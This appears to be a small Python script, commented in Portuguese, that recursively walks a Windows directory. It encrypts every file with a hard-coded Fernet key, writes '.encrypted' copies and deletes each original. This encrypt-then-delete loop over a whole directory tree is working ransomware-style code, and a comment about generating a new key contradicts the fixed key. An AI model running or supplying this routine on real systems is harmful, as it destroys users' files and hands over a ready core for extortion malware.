from cryptography.fernet import Fernet
import os

#def generate_key():
#    # Gera uma chave de criptografia aleatória
#    key = Fernet.generate_key()
#    return key

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()

    f = Fernet(key)
    encrypted_data = f.encrypt(data)

    encrypted_file_path = file_path + ".encrypted"
    with open(encrypted_file_path, 'wb') as file:
        file.write(encrypted_data)

    print(f"Arquivo criptografado: {encrypted_file_path}")

    # Remove o arquivo original
    os.remove(file_path)
    print(f"Arquivo original removido: {file_path}")

def encrypt_files_in_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

# Exemplo de uso
key = b'6NAupfi_RZ-sBx-9e8qEsZgS5SzQnhcGP07mBvz-Uzk='  # Gera uma nova chave de criptografia
directory = "c:/decrypt/cripto/."
print(key)

# Criptografa todos os arquivos no diretório
encrypt_files_in_directory(directory, key)
